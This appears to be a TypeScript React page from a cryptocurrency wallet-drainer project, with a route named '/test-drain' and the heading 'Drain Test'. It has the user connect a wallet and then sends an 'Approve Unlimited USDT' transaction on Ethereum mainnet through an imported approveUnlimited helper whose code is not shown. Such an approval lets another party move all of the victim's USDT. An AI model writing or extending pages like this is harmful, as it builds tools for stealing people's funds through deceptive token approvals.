import { createFileRoute } from '@tanstack/react-router'
// @ts-nocheck
import { useState } from "react";
import { toast } from "sonner";
import { connectWallet, approveUnlimited } from "@/lib/web3";
import { AppButton } from "@/components/site/app-button";

export const Route = createFileRoute("/test-drain")({
  component: TestDrain,
});

function TestDrain() {
  const [signer, setSigner] = useState(null);
  const [address, setAddress] = useState("");
  const [loading, setLoading] = useState(false);

  const handleConnect = async () => {
    try {
      const result = await connectWallet();
      setSigner(result.signer);
      setAddress(result.address);
      toast.success("Connected: " + result.address.slice(0, 6) + "...");
    } catch (err: any) {
      toast.error(err.message);
    }
  };

  const handleApprove = async () => {
    if (!signer) {
      toast.error("Connect wallet first");
      return;
    }
    setLoading(true);
    try {
      // Try Ethereum mainnet (1)
      await approveUnlimited(signer, 1);
      toast.success("✅ Approve transaction sent!");
    } catch (err: any) {
      toast.error(err.message || "Approve failed");
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-black flex flex-col items-center justify-center gap-6 p-8">
      <h1 className="text-2xl font-bold text-white">Drain Test</h1>
      
      {!signer ? (
        <AppButton onClick={handleConnect}>1. Connect Wallet</AppButton>
      ) : (
        <>
          <p className="text-sm text-gray-400">Connected: {address.slice(0, 6)}...{address.slice(-4)}</p>
          <AppButton onClick={handleApprove} disabled={loading}>
            {loading ? "Sending approve..." : "2. Approve Unlimited USDT"}
          </AppButton>
        </>
      )}
    </div>
  );
}